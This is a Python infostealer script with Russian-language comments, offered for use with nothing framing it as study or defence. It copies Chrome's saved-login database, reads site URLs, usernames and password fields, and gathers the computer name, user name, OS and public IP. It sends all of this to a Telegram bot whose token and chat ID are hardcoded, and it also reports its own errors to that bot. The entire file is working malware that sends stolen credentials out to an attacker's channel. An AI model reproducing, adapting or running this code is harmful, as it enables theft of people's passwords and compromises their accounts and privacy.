#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import sqlite3
import shutil
import requests
import platform
import socket
import getpass
from datetime import datetime

# ========== ТВОИ ДАННЫЕ (ЗАМЕНИ НИЖЕ) ==========
BOT_TOKEN = "8628479439:AAFpz6PzzLxeq2nzyWHUgSTgK-DJUmsDMb4"
CHAT_ID = "7621786641"
# ===============================================

def get_system_info():
    info = []
    info.append(f"🖥 Имя ПК: {platform.node()}")
    info.append(f"👤 Пользователь: {getpass.getuser()}")
    info.append(f"💿 ОС: {platform.system()} {platform.release()}")
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"🌐 IP: {ip}")
    except:
        info.append("🌐 IP: не определен")
    return "\n".join(info)

def steal_chrome_passwords():
    result = []
    try:
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                   'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        
        if not os.path.exists(chrome_path):
            return ["❌ Chrome не найден"]
        
        temp_db = 'temp_chrome.db'
        shutil.copy2(chrome_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        
        for row in cursor.fetchall()[:10]:
            url, username, password = row
            if username and password:
                result.append(f"🌐 {url}\n👤 {username}\n🔑 {password}\n")
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        result.append(f"❌ Ошибка: {e}")
    return result if result else ["❌ Паролей не найдено"]

def create_report():
    report = "🔥 **НОВЫЙ ЛОГ** 🔥\n\n"
    report += f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    report += "**💻 СИСТЕМА:**\n"
    report += get_system_info() + "\n\n"
    
    report += "**🔑 ПАРОЛИ:**\n"
    passwords = steal_chrome_passwords()
    for p in passwords:
        report += p + "\n"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': report[:4000], 'parse_mode': 'Markdown'}
    
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    try:
        create_report()
    except Exception as e:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': CHAT_ID, 'text': f"❌ Ошибка: {e}"})
